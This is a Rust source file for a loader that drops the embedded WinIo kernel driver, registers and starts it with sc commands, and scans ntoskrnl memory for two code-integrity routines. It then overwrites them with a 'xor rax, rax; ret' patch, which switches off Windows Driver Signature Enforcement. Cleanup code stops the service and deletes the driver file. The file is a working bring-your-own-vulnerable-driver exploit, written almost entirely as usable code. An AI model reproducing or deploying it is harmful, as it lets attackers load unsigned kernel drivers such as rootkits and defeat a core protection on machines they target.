use std::{
    fs::{self, File},
    io::Write,
    process::{Command, Stdio},
};

use memflow::{
    connector::mmap::MappedPhysicalMemory,
    mem::{CachedPhysicalMemory, CachedVirtualTranslate, DirectTranslate, MemoryView},
    os::Os,
    types::{cache::timed_validator::TimedCacheValidator, Address},
};
use memflow_vdm::VdmMapData;
use memflow_win32::win32::Win32Kernel;
use memflow_winio::create_connector;

use rayon::{iter::IndexedParallelIterator, slice::ParallelSlice};

use thiserror::Error;

// patterns from: https://github.com/emlinhax/dse_hook/blob/main/dse_hook.cpp

const SE_VALIDATE_IMAGE_HEADER_PATTERN: &str =
    "?? ?? ?? ?? 89 58 08 48 89 70 10 57 48 81 EC A0 00 00 00 33 F6";
const SE_VALIDATE_IMAGE_DATA_PATTERN: &str = "?? ?? ?? ?? 48 8B 05 ?? ?? ?? ?? 4C 8B D1 48 85 C0";

/// xor rax, rax
///
/// ret
const PATCH: [u8; 4] = [0x48, 0x31, 0xC0, 0xC3];

const SE_VALIDATE_IMAGE_HEADER_ORIGINAL: [u8; 4] = [0x48, 0x8B, 0xC4, 0x48];
const SE_VALIDATE_IMAGE_DATA_ORIGINAL: [u8; 4] = [0x48, 0x83, 0xEC, 0x48];

const SEARCH_RANGE: usize = 0xFFFFFF;

type Kernel = Win32Kernel<
    CachedPhysicalMemory<
        'static,
        MappedPhysicalMemory<&'static mut [u8], VdmMapData<'static>>,
        TimedCacheValidator,
    >,
    CachedVirtualTranslate<DirectTranslate, TimedCacheValidator>,
>;

pub struct WinIoLoader {
    kernel: Kernel,
    pub se_validate_image_header: Address,
    pub se_validate_image_data: Address,
    pub dse: bool,
    create_winio: bool,
}

impl WinIoLoader {
    pub fn new(create_winio: bool) -> Result<Self, Error> {
        if create_winio {
            let path = "./winio.sys";

            File::create(path)
                .and_then(|mut f| f.write_all(include_bytes!("../bin/winio.sys")))
                .map_err(|_| Error::Windows)?;

            Self::create_driver("WinIo", path)?;
        }

        let connector = create_connector(&Default::default()).map_err(|_| Error::Memflow)?;

        let mut kernel = Win32Kernel::builder(connector)
            .build_default_caches()
            .build()
            .map_err(|_| Error::Memflow)?;

        let ntoskrnl = kernel.info().base;

        let se_validate_image_header = Self::find_pattern(
            &mut kernel,
            ntoskrnl,
            SEARCH_RANGE,
            SE_VALIDATE_IMAGE_HEADER_PATTERN,
        )
        .ok_or(Error::NotFound)?;

        let se_validate_image_data = Self::find_pattern(
            &mut kernel,
            ntoskrnl,
            SEARCH_RANGE,
            SE_VALIDATE_IMAGE_DATA_PATTERN,
        )
        .ok_or(Error::NotFound)?;

        let dse = {
            let mut read_raw = |a: Address| kernel.read_raw(a, 4).map_err(|_| Error::Memflow);

            // These should never have an mismatching state
            read_raw(se_validate_image_header)? == SE_VALIDATE_IMAGE_HEADER_ORIGINAL
                || read_raw(se_validate_image_data)? == SE_VALIDATE_IMAGE_DATA_ORIGINAL
        };

        Ok(Self {
            kernel,
            se_validate_image_header,
            se_validate_image_data,
            dse,
            create_winio,
        })
    }

    /// Sets Driver Signature Enforcment based on `enabled`
    pub fn set_dse(&mut self, enabled: bool) -> Result<(), Error> {
        let mut write_raw =
            |a: Address, d: &[u8]| self.kernel.write_raw(a, d).map_err(|_| Error::Memflow);

        if enabled {
            write_raw(
                self.se_validate_image_header,
                &SE_VALIDATE_IMAGE_HEADER_ORIGINAL,
            )?;
            write_raw(
                self.se_validate_image_data,
                &SE_VALIDATE_IMAGE_DATA_ORIGINAL,
            )?;
        } else {
            write_raw(self.se_validate_image_header, &PATCH)?;
            write_raw(self.se_validate_image_data, &PATCH)?;
        }

        self.dse = enabled;

        Ok(())
    }

    /// Creates and starts a driver service, overwriting any existing one
    pub fn create_driver(name: &str, path: &str) -> Result<(), Error> {
        // Windows api just works worse than sc command T_T
        Command::new("cmd")
            .arg("/C")
            .arg(format!(r#"sc stop {}"#, name))
            .stdout(Stdio::null())
            .stdin(Stdio::null())
            .stderr(Stdio::null())
            .spawn()
            .map_err(|_| Error::Windows)?
            .wait()
            .map_err(|_| Error::Windows)?;

        Command::new("cmd")
            .arg("/C")
            .arg(format!(r#"sc delete {}"#, name))
            .stdout(Stdio::null())
            .stdin(Stdio::null())
            .stderr(Stdio::null())
            .spawn()
            .map_err(|_| Error::Windows)?
            .wait()
            .map_err(|_| Error::Windows)?;

        Command::new("cmd")
            .arg("/C")
            .arg(format!(
                r#"sc create {} type=kernel binPath={} && sc start {}"#,
                name,
                fs::canonicalize(path)
                    .map_err(|_| Error::Windows)?
                    .to_string_lossy(),
                name,
            ))
            .stdout(Stdio::null())
            .stdin(Stdio::null())
            .stderr(Stdio::null())
            .spawn()
            .map_err(|_| Error::Windows)?
            .wait()
            .map_err(|_| Error::Windows)?;

        Ok(())
    }

    fn find_pattern<T: MemoryView>(
        kernel: &mut T,
        start: Address,
        range: usize,
        pattern: &str,
    ) -> Option<Address> {
        let parse_pattern = |pattern: &str| -> (Vec<u8>, Vec<bool>) {
            let mut bytes = Vec::new();
            let mut mask = Vec::new();

            for chunk in pattern.split_whitespace() {
                if "??" == chunk {
                    bytes.push(0); // placeholder for wildcard
                    mask.push(true);
                } else {
                    bytes.push(u8::from_str_radix(chunk, 16).unwrap());
                    mask.push(false);
                }
            }

            (bytes, mask)
        };

        let matches_pattern = |buffer: &[u8], pattern: &[u8], mask: &[bool]| {
            buffer
                .iter()
                .zip(pattern.iter())
                .zip(mask.iter())
                .all(|((&b, &p), &m)| m || b == p)
        };

        let buffer = kernel.read_raw(start, range).ok()?;

        let (pattern, mask) = parse_pattern(pattern);

        buffer
            .par_windows(pattern.len())
            .position_any(|window| matches_pattern(window, &pattern, &mask))
            .map(|offset| start + offset)
    }
}

impl Drop for WinIoLoader {
    fn drop(&mut self) {
        if self.create_winio {
            let _ = Command::new("cmd")
                .arg("/C")
                .arg("timeout /t 10 >nul && sc stop WinIo && sc delete WinIo && del winio.sys")
                .stdout(Stdio::null())
                .stderr(Stdio::null())
                .spawn();
        }
    }
}

#[derive(Error, Debug, Clone, PartialEq, Hash)]
pub enum Error {
    #[error("Windows error")]
    Windows,
    #[error("Memflow error")]
    Memflow,
    #[error("Not found")]
    NotFound,
}
